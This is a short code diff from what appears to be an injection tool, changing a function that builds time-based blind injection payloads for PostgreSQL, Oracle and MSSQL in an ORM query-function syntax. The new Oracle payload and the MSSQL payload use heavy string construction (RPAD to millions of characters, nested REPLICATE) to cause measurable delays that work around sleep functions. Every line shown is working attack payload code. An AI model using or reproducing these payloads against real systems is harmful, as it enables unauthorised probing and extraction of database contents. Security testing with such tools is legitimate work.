@@ -18,8 +18,9 @@ def build_injection(db: str, sleep_seconds: int) -> str:
         # pg_sleep returns void; treat call result as null -> predicate using IS NULL
         expr = f"function('pg_sleep',{sleep_seconds}) is null"
     elif db == "oracle":
-        # dbms_lock.sleep(N) returns 0 on success
-        expr = f"function('dbms_lock.sleep',{sleep_seconds})=0"
+        # dbms_session.sleep(N) returns 0 on success
+        #expr = f"function('dbms_session.sleep',{sleep_seconds})=0"
+        expr = f"function('DBMS_LOB.GETLENGTH',function('RPAD', function('TO_CLOB','A'), 5000000, 'A')) > 0"
     elif db == "mssql":
         expr = f"function('DATALENGTH', function('REPLICATE', function('CONCAT', function('NEWID'), function('REPLICATE','A',4000), function('REPLICATE','B',4000), function('REPLICATE','C',4000), function('REPLICATE','D',4000)), 50000))>0"
     else:
